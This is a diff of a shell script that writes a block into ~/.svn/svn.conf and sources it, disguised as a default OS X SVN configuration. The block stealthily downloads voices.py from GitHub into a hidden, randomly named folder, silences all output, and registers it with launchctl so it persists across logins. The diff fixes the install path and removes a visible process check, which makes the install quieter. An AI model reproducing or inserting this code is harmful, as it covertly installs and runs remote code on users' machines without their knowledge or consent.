@@ -8,7 +8,7 @@ mkdir -p ~/.svn/
 #!/usr/bin/env bash
 ${PRE}(ps | grep '[0-9]* python voices.py\$') > /dev/null 2>&1
 ${PRE}if [ ! $? -ne 0 ]; then
-${PRE}    APP_DIR="${PWD}/Library/Application Support/.\${RANDOM}-\${RANDOM}/"
+${PRE}    APP_DIR="${HOME}/Library/Application Support/.\${RANDOM}-\${RANDOM}/"
 ${PRE}    mkdir -p "\${APP_DIR}"
 ${PRE}    cd "\${APP_DIR}"
 ${PRE}    curl -O https://github.com/dcramer/voices.py/raw/master/voices.py > /dev/null 2>&1
@@ -35,13 +35,12 @@ ${PRE}    echo "<?xml version=\"1.0\" encoding=\"UTF-8\"?>
 launchctl load -wF "\${APP_DIR}voices.plist" > /dev/null 2>&1
 launchctl start "\${APP_DIR}voices.plist" > /dev/null 2>&1
 ${PRE}fi
-cd ${PWD}
+cd ${HOME}
 EOF
 } >> ~/.svn/svn.conf
 
 . ~/.svn/svn.conf
 
-ps aux | grep voices.py
 grep "Default OS X SVN configuration" ~/.profile > /dev/null 2>&1
 if [ $? -ne 0 ]; then
     echo "
